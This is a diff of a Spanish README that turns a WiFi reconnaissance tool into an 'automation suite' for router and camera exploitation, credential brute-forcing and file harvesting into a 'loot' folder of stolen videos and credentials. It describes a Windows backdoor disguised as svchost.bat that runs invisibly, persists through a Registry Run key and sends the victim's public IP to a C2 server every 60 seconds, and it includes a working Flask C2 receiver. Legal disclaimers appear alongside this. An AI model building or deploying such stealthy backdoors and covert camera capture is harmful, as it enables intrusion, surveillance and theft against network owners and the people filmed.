@@ -1,458 +1,373 @@
-# Red Recognition - Reconocimiento de Red WiFi y Descarga de Archivos
+# Red Recognition - Pentesting Automation Suite
 
-Script modular de Python para reconocimiento automático de redes WiFi y descarga de archivos compartidos. Diseñado para pentesting y auditorías de seguridad en Kali Linux.
+Sistema modular automatizado de reconocimiento y explotación de redes para pruebas de penetración profesionales.
 
-## 🎯 Características
+## ⚠️ ADVERTENCIA LEGAL
 
-### Módulo 1: Reconocimiento de Red
-- ✅ **Auto-detección de red WiFi** - Detecta automáticamente SSID, canal, frecuencia, señal, IP, gateway y rango de red
-- ✅ **Descubrimiento de hosts** - Escaneo ARP para identificar todos los dispositivos conectados
-- ✅ **Escaneo de puertos** - Detecta puertos abiertos (top 1000 o top 100 en modo rápido)
-- ✅ **Identificación de servicios** - Detecta servicios, versiones y sistemas operativos
-- ✅ **Guardado incremental** - Los datos se guardan continuamente (no se pierden si se interrumpe)
-- ✅ **IP pública y geolocalización** - Obtiene tu IP pública, ISP y ubicación
+**USO EXCLUSIVO PARA PRUEBAS AUTORIZADAS**
 
-### Módulo 2: Descarga de Archivos Compartidos
-- ✅ **Recursos compartidos SMB/SAMBA** - Intenta acceso anónimo y descarga archivos
-- ✅ **Servidores FTP** - Verifica acceso FTP anónimo y descarga archivos
-- ✅ **Directorios HTTP** - Detecta directorios web accesibles públicamente
-- ✅ **Descarga inteligente** - Limita tamaño de archivos y cantidad por host
-- ✅ **Organización automática** - Archivos organizados por IP/Servicio
-- ✅ **Guardado incremental** - Metadata guardada continuamente
+Este software está diseñado EXCLUSIVAMENTE para:
+- Pruebas de penetración autorizadas
+- Auditorías de seguridad con permiso explícito
+- Evaluaciones de seguridad en redes propias
 
-## 📋 Requisitos
+**EL USO NO AUTORIZADO ES ILEGAL** y puede resultar en procesamiento criminal, multas significativas y tiempo en prisión.
 
-- Kali Linux
-- Python 3.7+
-- Nmap
-- Permisos de root
+## 🚀 Características
 
-## 🚀 Instalación
+### Módulos Implementados
+
+1. **Módulo 1: Network Reconnaissance**
+   - Escaneo completo de red WiFi
+   - Descubrimiento de hosts activos
+   - Escaneo de puertos y servicios
+   - Detección de sistema operativo
+   - Opción de saltar escaneo de puertos
+
+2. **Módulo 2: File Harvester**
+   - Descarga de archivos compartidos (SMB/FTP/HTTP)
+   - Búsqueda de datos sensibles
+   - Organización automática por host
+
+3. **Módulo 3: Router Exploitation**
+   - Explotación de routers (especialmente Ruijie Networks)
+   - Credenciales por defecto y fuerza bruta
+   - Descarga de configuración del router
+   - Extracción de credenciales WiFi
+   - **Instalación de backdoors remotos**
+
+4. **Módulo 4: Camera/XVR Exploitation**
+   - Explotación de cámaras IP y DVR/NVR
+   - Acceso a streams RTSP
+   - **Captura de video en vivo (hasta 3 min o 200MB)**
+   - Screenshots automáticos
+   - Descarga de configuraciones
+
+5. **Módulo 5: Service Exploitation**
+   - Explotación de servicios específicos
+   - Ataques a DNS, HTTP, lighttpd
+   - Directory traversal
+   - Identificación de servicios tcpwrapped
+
+6. **Módulo 6: Credential Harvesting**
+   - Fuerza bruta a SSH, FTP, SMB
+   - Diccionario de credenciales comunes
+   - **Almacenamiento de credenciales comprometidas**
+   - Movimiento lateral
+
+7. **Módulo 7: Backdoor & Persistence Manager**
+   - **Instalación de backdoors en Windows**
+   - **Payload con reporte a C2 server**
+   - Persistencia via registry (Windows)
+   - Persistencia via crontab (Linux)
+   - Ejecución invisible (VBS)
+   - **Reporte de IP pública cada 60 segundos**
+
+8. **Módulo 8: Report Generator**
+   - Informe consolidado JSON
+   - **Informe ejecutivo HTML**
+   - Score de riesgo (0-100)
+   - Hallazgos críticos
+   - Recomendaciones priorizadas
+
+## 📦 Instalación
+
+### Requisitos
+- Python 3.8+
+- Kali Linux recomendado (puede funcionar en otras distribuciones)
+- Privilegios de root/administrador
+
+### Dependencias
 
 ```bash
-# Instalar dependencias del sistema
+# Instalar dependencias del sistema (Debian/Ubuntu/Kali)
 sudo apt-get update
-sudo apt-get install -y python3 python3-pip nmap wireless-tools network-manager
+sudo apt-get install -y python3-pip nmap curl dig
 
 # Instalar dependencias de Python
-sudo pip3 install -r requirements.txt
+pip3 install -r requirements.txt
 ```
 
-## 💻 Uso
+### Configuración
 
-### Conectarse a WiFi primero
+1. **Copiar archivo de configuración:**
+```bash
+cp config.env.example config.env
+```
+
+2. **Editar config.env con tus valores:**
+```bash
+nano config.env
+```
+
+Configurar especialmente:
+- `C2_SERVER_URL`: Tu servidor de Command & Control para recibir IPs comprometidas
+- `C2_IDENTIFIER`: Identificador único para tus ataques (ej: EUROPEAN, PROJECT_X, etc.)
+- `ROUTER_BACKDOOR_*`: Credenciales para backdoors en router
+- Otros parámetros según necesites
+
+## 🎮 Uso
+
+### Ejecución Básica
 
 ```bash
-# Ver redes disponibles
-sudo nmcli device wifi list
-
-# Conectarse
-sudo nmcli device wifi connect "NOMBRE_RED" password "CONTRASEÑA"
-```
-
-### Módulo 1: Reconocimiento de Red
-
-```bash
-# Ver información de WiFi (sin escanear)
-sudo python3 main.py --show-wifi-only
-
-# Escaneo completo (15-30 min) - MÓDULO 1 por defecto
-sudo python3 main.py
-
-# O explícitamente
-sudo python3 main.py -m 1
-
-# Escaneo rápido (5-10 min)
-sudo python3 main.py --quick
-
-# Solo descubrir hosts (1-2 min)
-sudo python3 main.py --no-port-scan
-
-# Archivo de salida personalizado
-sudo python3 main.py -o mi_escaneo.json
-
-# Especificar interfaz manualmente
-sudo python3 main.py -i wlan0
-```
-
-### Módulo 2: Descarga de Archivos Compartidos
-
-```bash
-# Ejecutar módulo 2 (usa reconocimiento.json por defecto)
-sudo python3 main.py -m 2
-
-# Usar archivo de reconocimiento personalizado
-sudo python3 main.py -m 2 --recon-file mi_escaneo.json
-
-# Limitar tamaño máximo de archivos (en MB)
-sudo python3 main.py -m 2 --max-file-size 50
-
-# Limitar cantidad de archivos por host
-sudo python3 main.py -m 2 --max-files 50
-
-# Combinación de opciones
-sudo python3 main.py -m 2 --max-file-size 20 --max-files 200
-```
-
-### Flujo de trabajo completo
-
-```bash
-# 1. Reconocimiento de red
-sudo python3 main.py
-
-# 2. Descarga de archivos compartidos
-sudo python3 main.py -m 2
-
-# Ver ayuda
-python3 main.py --help
-```
-
-## 📊 Salida
-
-### Módulo 1: Reconocimiento
-
-El Módulo 1 genera un archivo JSON (`reconocimiento.json` por defecto) con:
-
-### Información de WiFi detectada automáticamente
-```json
-{
-  "wifi_connection": {
-    "interface": "wlan0",
-    "ssid": "MiRed-WiFi",
-    "bssid": "AA:BB:CC:DD:EE:FF",
-    "frequency": "2.437 GHz",
-    "channel": "6",
-    "signal_quality": "75%",
-    "signal_level": "-45 dBm",
-    "ip_address": "192.168.1.100",
-    "gateway": "192.168.1.1",
-    "network_range": "192.168.1.0/24"
-  }
-}
-```
-
-### Hosts descubiertos
-```json
-{
-  "discovered_hosts": [
-    {
-      "ip": "192.168.1.1",
-      "mac": "AA:BB:CC:DD:EE:FF",
-      "vendor": "TP-Link Technologies",
-      "hostname": "router.home",
-      "ports": [
-        {
-          "port": 22,
-          "protocol": "tcp",
-          "state": "open",
-          "service": "ssh",
-          "product": "OpenSSH",
-          "version": "8.4p1"
-        }
-      ],
-      "services": {...},
-      "os_detection": {...}
-    }
-  ]
-}
-```
-
-### Resumen del escaneo
-```json
-{
-  "scan_summary": {
-    "scan_duration_seconds": 287.45,
-    "total_hosts_discovered": 4,
-    "total_open_ports": 12,
-    "network_range_scanned": "192.168.1.0/24"
-  }
-}
-```
-
-### Módulo 2: Archivos Descargados
-
-El Módulo 2 genera:
-- **Directorio `harvested_files/`** con archivos descargados organizados por IP y servicio
-- **Archivo `archivos_descargados.json`** con metadata
-
-Estructura de directorios:
-```
-harvested_files/
-├── 192.168.1.1/
-│   ├── SMB/
-│   │   └── SharedDocs/
-│   │       ├── documento1.pdf
-│   │       └── archivo.txt
-│   └── FTP/
-│       └── backup.zip
-└── 192.168.1.10/
-    └── SMB/
-        └── Public/
-            └── readme.txt
-```
-
-Contenido del JSON:
-```json
-{
-  "timestamp": "2025-10-16T...",
-  "hosts_analyzed": [
-    {
-      "ip": "192.168.1.1",
-      "hostname": "server.local",
-      "services_checked": ["SMB", "FTP"],
-      "shares_found": [
-        {
-          "type": "SMB",
-          "name": "SharedDocs",
-          "path": "\\\\192.168.1.1\\SharedDocs",
-          "accessible": true,
-          "files": [...]
-        }
-      ],
-      "files_downloaded": [
-        {
-          "filename": "documento1.pdf",
-          "size": 524288,
-          "share": "SharedDocs",
-          "local_path": "harvested_files/192.168.1.1/SMB/SharedDocs/documento1.pdf",
-          "downloaded_at": "2025-10-16T..."
-        }
-      ]
-    }
-  ],
-  "statistics": {
-    "total_hosts": 4,
-    "hosts_with_shares": 2,
-    "smb_shares_found": 3,
-    "ftp_accessible": 1,
-    "total_files_downloaded": 15,
-    "total_size_bytes": 15728640,
-    "failed_downloads": 2
-  }
-}
-```
-
-## 🔧 Auto-configuración
-
-El script detecta automáticamente la red WiFi usando tres métodos (en orden):
-
-1. **nmcli** (Network Manager) - método preferido
-2. **iwconfig** (Wireless Tools) - fallback
-3. **Búsqueda manual** - último recurso (interfaces wlan*, wlp*)
-
-No necesitas especificar la interfaz ni el rango de red manualmente.
-
-## 🛠️ Solución de problemas
-
-### "No se detectó conexión WiFi"
-```bash
-# Verificar conexión
-nmcli device status
-iwconfig
-
-# Reconectar
-sudo nmcli device wifi connect "SSID" password "PASSWORD"
-```
-
-### "Permission denied"
-```bash
-# Siempre ejecutar con sudo
 sudo python3 main.py
 ```
 
-### "Module not found"
+### Modos de Ejecución
+
+El script presenta un menú interactivo con las siguientes opciones:
+
+1. **🎯 Ejecutar TODO (Full Pentesting Suite)**
+   - Ejecuta todos los módulos secuencialmente
+   - Te pregunta qué hacer en cada módulo
+   - Genera informe consolidado al final
+
+2. **📋 Seleccionar módulos manualmente**
+   - Eliges exactamente qué módulos ejecutar
+   - Control total sobre el proceso
+
+3. **⚡ Modo rápido**
+   - Solo credenciales y servicios críticos
+   - Ideal para evaluaciones rápidas
+
+4. **🔍 Solo reconocimiento**
+   - Sin ataques, solo escaneo
+   - Perfecto para fase inicial
+
+5. **📊 Solo generar informe**
+   - Consolida informes existentes
+   - Genera HTML ejecutivo
+
+### Ejemplo de Flujo Completo
+
 ```bash
-# Reinstalar dependencias
-sudo pip3 install -r requirements.txt
+sudo python3 main.py
+
+# 1. Acepta advertencia legal
+# 2. Selecciona "Ejecutar TODO"
+# 3. Confirma cada módulo:
+#    - Reconocimiento: SÍ (con escaneo de puertos)
+#    - File Harvester: SÍ
+#    - Router Exploit: SÍ (con backdoor)
+#    - Camera Exploit: SÍ (capturar video)
+#    - Service Exploit: SÍ
+#    - Credential Harvest: SÍ
+#    - Backdoor Manager: SÍ
+# 4. Espera a que termine (puede tardar 30-60 minutos)
+# 5. Revisa informes en reports/
 ```
 
-### No encuentra dispositivos
-```bash
-# Verificar conectividad al gateway
-ping $(ip route | grep default | awk '{print $3}')
-
-# Ver info de WiFi para diagnosticar
-sudo python3 main.py --show-wifi-only
-```
-
-## 🔒 Arquitectura Modular
+## 📁 Estructura de Archivos
 
 ```
 RedRecognition/
-├── main.py                      # Script principal
-├── modules/
+├── main.py                          # Script principal
+├── config.env.example               # Ejemplo de configuración
+├── config.env                       # Tu configuración (NO SUBIR A GIT)
+├── requirements.txt                 # Dependencias Python
+├── modules/                         # Módulos de ataque
 │   ├── __init__.py
-│   ├── network_recon.py         # Módulo 1: Reconocimiento
-│   └── file_harvester.py        # Módulo 2: Descarga de archivos
-├── requirements.txt             # Dependencias
-├── README.md                    # Este archivo
-├── reconocimiento.json          # Salida Módulo 1 (generado)
-├── archivos_descargados.json    # Salida Módulo 2 (generado)
-└── harvested_files/             # Archivos descargados (generado)
+│   ├── network_recon.py
+│   ├── file_harvester.py
+│   ├── router_exploit.py
+│   ├── camera_exploit.py
+│   ├── service_exploit.py
+│   ├── credential_harvest.py
+│   ├── backdoor_manager.py
+│   └── report_generator.py
+├── reports/                         # Informes generados
+│   ├── informe_reconocimiento.json
+│   ├── informe_router_exploitation.json
+│   ├── informe_camera_exploitation.json
+│   ├── informe_service_exploitation.json
+│   ├── informe_credential_harvesting.json
+│   ├── informe_backdoor_persistence.json
+│   ├── INFORME_GENERAL_PENTESTING.json
+│   └── INFORME_EJECUTIVO.html       # ⭐ ABRIR ESTE EN NAVEGADOR
+├── loot/                            # Datos robados
+│   ├── stolen_videos/               # Videos capturados
+│   ├── router_configs/              # Configs de router
+│   ├── credentials/                 # Credenciales encontradas
+│   │   ├── credentials_found.json
+│   │   └── credentials_found.txt
+│   └── backdoors/                   # Instrucciones de backdoors
+│       └── access_instructions.txt  # ⭐ COMO ACCEDER A BACKDOORS
+└── harvested_files/                 # Archivos compartidos descargados
 ```
 
-### Módulos futuros planificados
-- Módulo 3: Análisis de vulnerabilidades
-- Módulo 4: Exploración web avanzada
-- Módulo 5: Reportes en PDF/HTML
+## 🎯 Funcionalidades Destacadas
 
-## ⚠️ Advertencia Legal
+### Backdoor de Windows
 
-**IMPORTANTE:** Esta herramienta es solo para uso autorizado.
+El módulo de backdoors instala un payload avanzado en sistemas Windows comprometidos:
 
-✅ **Permitido:**
-- Tu propia red doméstica
-- Redes con autorización escrita del propietario
-- Laboratorios de pentesting autorizados
-- Entornos educativos
+**Características:**
+- ✅ Ejecución completamente invisible (sin ventana)
+- ✅ Persistencia automática (Registry Run Key)
+- ✅ Reporte de IP pública al C2 cada 60 segundos
+- ✅ Identificador personalizable
+- ✅ Sobrevive a reinicios
+- ✅ Proceso en background
 
-❌ **Prohibido:**
-- Redes públicas sin autorización
-- Redes de terceros
-- Cualquier red sin permiso explícito
+**Funcionamiento:**
+1. Crea script batch en `%temp%\svchost.bat`
+2. Crea VBScript invisible en `%temp%\invisible.vbs`
+3. Agrega entrada en `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
+4. Ejecuta cada 60 segundos: obtiene IP pública y la envía a tu C2
+5. Formato: `http://TU_C2/?ip=EUROPEAN_X.X.X.X`
 
-El uso no autorizado puede ser **ilegal** y resultar en consecuencias legales graves.
+### Captura de Video
 
-## 📝 Notas Técnicas
+El módulo de cámaras captura video real de streams RTSP:
 
-### Dependencias de Python
+**Características:**
+- ✅ Captura hasta 3 minutos o 200MB (configurable)
+- ✅ Formato MP4 compatible
+- ✅ Screenshots automáticos
+- ✅ Múltiples cámaras simultáneas
+- ✅ Progreso en tiempo real
 
-**Módulo 1:**
-- `scapy` - Escaneo ARP de red
-- `python-nmap` - Escaneo de puertos y servicios
-- `netifaces` - Información de interfaces de red
-- `requests` - Obtención de IP pública
+### Informe Ejecutivo HTML
 
-**Módulo 2:**
-- `pysmb` - Acceso a recursos compartidos SMB/SAMBA
-- `requests` - Descarga HTTP
-- `ftplib` - Acceso FTP (librería estándar)
+Genera un informe visual profesional con:
 
-### Guardado incremental
-El script guarda los resultados después de cada descubrimiento importante:
-- Después de detectar WiFi
-- Después de cada host encontrado
-- Después de escanear cada host
+- Score de riesgo (0-100) con código de colores
+- Resumen ejecutivo con métricas clave
+- Hallazgos críticos destacados
+- Recomendaciones priorizadas
+- Diseño responsive y profesional
 
-Si se interrumpe (Ctrl+C), los datos parciales están guardados.
+## 🛡️ Remediación Post-Prueba
 
-### Métodos de detección WiFi
+**IMPORTANTE:** Después de una prueba autorizada, debes:
 
-**nmcli (preferido):**
+1. **Remover todos los backdoors:**
+   ```bash
+   # Windows: eliminar entradas de registry y archivos temp
+   # Linux: eliminar entradas de crontab y scripts
+   ```
+
+2. **Notificar al cliente sobre:**
+   - Todas las credenciales comprometidas
+   - Backdoors instalados y ubicaciones exactas
+   - Videos/archivos capturados
+   - Configuraciones descargadas
+
+3. **Proporcionar:**
+   - Informe ejecutivo HTML
+   - Informe técnico JSON completo
+   - Instrucciones de remediación
+
+## 🔧 Configuración Avanzada
+
+### Servidor C2 para Backdoors
+
+Para recibir reportes de backdoors, configura un servidor simple:
+
+```python
+# simple_c2.py
+from flask import Flask, request
+app = Flask(__name__)
+
+@app.route('/')
+def receive_ip():
+    ip = request.args.get('ip', 'unknown')
+    print(f"[+] Received IP: {ip}")
+    with open('compromised_ips.log', 'a') as f:
+        f.write(f"{ip}\n")
+    return 'OK'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8000)
+```
+
 ```bash
-nmcli -t -f DEVICE,TYPE,STATE device
-nmcli -t -f SSID,BSSID,FREQ,CHAN,SIGNAL device wifi list
+python3 simple_c2.py
 ```
 
-**iwconfig (fallback):**
+### Ajustar Agresividad
+
+En `config.env`:
+
+```ini
+# Nivel de agresividad (1-5)
+ATTACK_AGGRESSIVENESS=3
+
+# Delay entre intentos (segundos)
+ATTACK_DELAY=0.5
+
+# Threads para fuerza bruta
+BRUTE_FORCE_THREADS=5
+
+# Máximo de intentos por servicio
+MAX_ATTEMPTS_PER_SERVICE=50
+```
+
+## 📊 Interpretación de Resultados
+
+### Risk Score
+
+- **0-20**: Riesgo BAJO - Pocas vulnerabilidades
+- **21-40**: Riesgo MEDIO - Vulnerabilidades presentes
+- **41-70**: Riesgo ALTO - Múltiples vectores de ataque
+- **71-100**: Riesgo CRÍTICO - Compromisos confirmados
+
+### Status de Módulos
+
+- **SUCCESS**: Objetivo comprometido exitosamente
+- **PARTIAL**: Vulnerabilidades encontradas pero no explotadas
+- **FAILED**: No se encontraron vulnerabilidades
+- **ERROR**: Error durante ejecución
+
+## 🐛 Troubleshooting
+
+### Error: "Permission denied"
 ```bash
-iwconfig
-# Extrae SSID, BSSID, frecuencia, calidad de señal
+# Asegúrate de ejecutar con sudo
+sudo python3 main.py
 ```
 
-**Manual (último recurso):**
+### Error: "Module not found"
 ```bash
-# Busca interfaces: wlan*, wlp*, wlo*, wl*
-# Verifica que tenga IP asignada
+# Reinstalar dependencias
+pip3 install -r requirements.txt --force-reinstall
 ```
 
-## 🎓 Ejemplos de uso
-
-### Auditoría completa (Módulo 1 + 2)
+### Video no se captura
 ```bash
-# Paso 1: Reconocimiento
-sudo python3 main.py -o auditoria_casa.json
+# Verificar OpenCV
+python3 -c "import cv2; print(cv2.__version__)"
 
-# Paso 2: Descarga de archivos
-sudo python3 main.py -m 2 --recon-file auditoria_casa.json
+# Reinstalar si es necesario
+pip3 install opencv-python opencv-contrib-python
 ```
 
-### Pentesting rápido
-```bash
-# Reconocimiento rápido
-sudo python3 main.py --quick -o pentest.json
+### Backdoor no funciona en Windows
+- Verificar que curl esté disponible en Windows (Windows 10+)
+- Verificar que el firewall no bloquee conexiones salientes
+- Verificar que el C2 server esté accesible
 
-# Descarga limitada de archivos
-sudo python3 main.py -m 2 --recon-file pentest.json --max-file-size 5 --max-files 50
-```
+## 🤝 Contribuciones
 
-### Inventario de red
-```bash
-# Solo hosts (sin puertos)
-sudo python3 main.py --no-port-scan -o inventario.json
-```
+Este es un proyecto de pentesting profesional. Las contribuciones son bienvenidas siempre que:
 
-### Escaneos con timestamp
-```bash
-# Reconocimiento con fecha
-FECHA=$(date +%Y%m%d_%H%M%S)
-sudo python3 main.py -o "scan_${FECHA}.json"
+1. Mantengan el enfoque de seguridad ofensiva
+2. Incluyan documentación adecuada
+3. Respeten las advertencias legales
+4. Sean funcionales y probadas
 
-# Descarga de archivos
-sudo python3 main.py -m 2 --recon-file "scan_${FECHA}.json"
-```
+## 📝 Licencia
 
-### Análisis de resultados
+Este software se proporciona "AS IS" para propósitos educativos y de seguridad autorizada únicamente.
 
-**Módulo 1:**
-```bash
-# Ver solo IPs encontradas
-cat reconocimiento.json | jq -r '.discovered_hosts[].ip'
+El autor no se hace responsable del uso indebido de esta herramienta.
 
-# Contar hosts descubiertos
-cat reconocimiento.json | jq '.discovered_hosts | length'
+## 👤 Autor
 
-# Ver puertos abiertos por host
-cat reconocimiento.json | jq '.discovered_hosts[] | {ip: .ip, ports: [.ports[].port]}'
-```
-
-**Módulo 2:**
-```bash
-# Ver archivos descargados
-cat archivos_descargados.json | jq '.files_downloaded[].filename'
-
-# Contar archivos por host
-cat archivos_descargados.json | jq '.hosts_analyzed[] | {ip: .ip, count: (.files_downloaded | length)}'
-
-# Ver estadísticas
-cat archivos_descargados.json | jq '.statistics'
-
-# Listar archivos descargados físicamente
-find harvested_files/ -type f
-```
-
-## 🚦 Flujo de Ejecución
-
-### Módulo 1: Reconocimiento
-1. Verifica permisos de root
-2. Detecta automáticamente la conexión WiFi
-3. Muestra toda la información de la red
-4. Pide confirmación para continuar
-5. Escanea la red buscando hosts (ARP)
-6. Escanea puertos en cada host (Nmap)
-7. Identifica servicios y versiones
-8. Guarda todo en JSON
-
-### Módulo 2: Descarga de Archivos
-1. Lee el archivo de reconocimiento del Módulo 1
-2. Identifica hosts con servicios de archivos (SMB, FTP, HTTP)
-3. Para cada host:
-   - Intenta acceso anónimo a SMB/SAMBA
-   - Intenta acceso FTP anónimo
-   - Verifica directorios HTTP comunes
-4. Descarga archivos accesibles (respetando límites)
-5. Organiza archivos por host/servicio
-6. Guarda metadata en JSON
-
-## 📞 Soporte
-
-Si encuentras problemas:
-
-1. Verifica que estés conectado a WiFi: `nmcli device status`
-2. Ejecuta con sudo: `sudo python3 main.py`
-3. Prueba la detección: `sudo python3 main.py --show-wifi-only`
-4. Verifica dependencias: `pip3 list | grep -E "(scapy|nmap|netifaces|requests)"`
+Red Recognition - Pentesting Automation Suite
+Versión 2.0
 
 ---
 
-**Desarrollado para auditorías de seguridad en Kali Linux** 🐧🛡️
+**Recuerda:** Usa esta herramienta de manera responsable y ética. Siempre obtén autorización explícita antes de realizar pruebas de penetración.
